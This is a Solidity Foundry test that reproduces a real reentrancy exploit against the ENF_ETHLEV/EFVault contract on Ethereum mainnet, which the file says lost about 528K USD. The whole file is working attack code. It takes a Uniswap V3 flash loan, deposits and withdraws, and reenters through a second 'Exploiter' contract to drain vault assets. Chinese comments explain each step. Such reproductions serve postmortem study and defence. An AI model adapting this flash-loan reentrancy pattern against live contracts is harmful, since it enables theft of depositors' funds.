// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~528K USD$
// Attacker : https://etherscan.io/address/0xee4b3dd20902fa3539706f25005fa51d3b7bdf1b
// Attack Tx : https://etherscan.io/tx/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa
// Attack Contract : https://etherscan.io/address/0xfe141c32e36ba7601d128f0c39dedbe0f6abb983
// Vulnerable Contract : https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e#code

// @Phalcon View: https://explorer.phalcon.xyz/tx/eth/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1689182459269644288

// Root cause : Reentrancy

interface IENF_ETHLEV is IERC20 {
    function deposit(uint256 assets, address receiver) external payable returns (uint256);

    function withdraw(uint256 assets, address receiver) external returns (uint256);

    function convertToAssets(uint256 shares) external view returns (uint256);

    function totalAssets() external view returns (uint256);
}

contract Attacker is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Pair_V3 Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    // ENF_ETHLEV --- EFVault的代理合约
    // 0x863e572B215Fd67C855d973F870266cF827AEa5e 才是 EFVault的逻辑合约,也是存在逻辑漏洞的合约
    // EFVault质押后的资产证明代币(shares)
    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
    // Controller --- EFVault 的 controller 变量地址
    address Controller = 0xE8688D014194fd5d7acC3c17477fD6db62aDdeE9;
    Exploiter exploiter;
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 17875885);
        vm.label(address(WETH), "WETH");
        vm.label(address(ENF_ETHLEV), "ENF_ETHLEV");
        vm.label(address(Pair), "Piar");
    }

    function testExploit() external {
        deal(address(this), 0);
        emit log_named_decimal_uint(
            "Attacker WETH balance before exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        // 部署攻击合约
        exploiter = new Exploiter();

        // 借Uniswap_V3的闪电贷,触发回调uniswapV3FlashCallback()
        Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        // 将借来的WETH都兑换成ETH
        WETH.withdraw(WETH.balanceOf(address(this)));
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
        uint256 assets = ENF_ETHLEV.totalAssets();
        // 往EFVault里存入其总资产价值
        ENF_ETHLEV.deposit{value: assets}(assets, address(this)); // deposit eth, mint shares

        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        // 取出所有的资产,并触发 receive,将资产转到攻击合约
        ENF_ETHLEV.withdraw(assetsAmount, address(this));

        // !!! 重入发生点
        // 调用攻击合约的withdraw(),凭借着hacker转来的shares资产证明,再次从EFVault中取出所有资产
        // 并将取出的资产发回给攻击者地址
        exploiter.withdraw();

        // ETH换到WETH
        WETH.deposit{value: address(this).balance}();
        uint256 amount = abi.decode(data, (uint256));
        // 还了WETH的闪电贷,剩下攻击所得的大约154个WETH,攻击完成
        // 注意: 这里的重入攻击是不会向常规的重入攻击那样耗尽池子资产的,这里就是重入一次
        // 是依靠另一个地址(这里是 Exploiter 合约)来重入的,不是常规重入那种一个地址来会进入withdraw()
        // 154 WETH ~$286k ,而后面hacker又多次发动了攻击,最终大约 154 + 129 + 2 WETH ~$528K
        WETH.transfer(address(Pair), amount1 + amount);
    }

    receive() external payable {
        // 检查 msg.sender 是否为 Controller 和 nonce 的设定,确保了此处的 receive() 只会触发一次
        if (msg.sender == Controller && nonce == 0) {
            // 转资产到 exploiter 攻击合约,但还留了点,出于防止shares的更新检查吧
            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1000);
            nonce++;
        }
    }
}

contract Exploiter {
    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);

    function withdraw() external {
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        ENF_ETHLEV.withdraw(assetsAmount, address(this));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
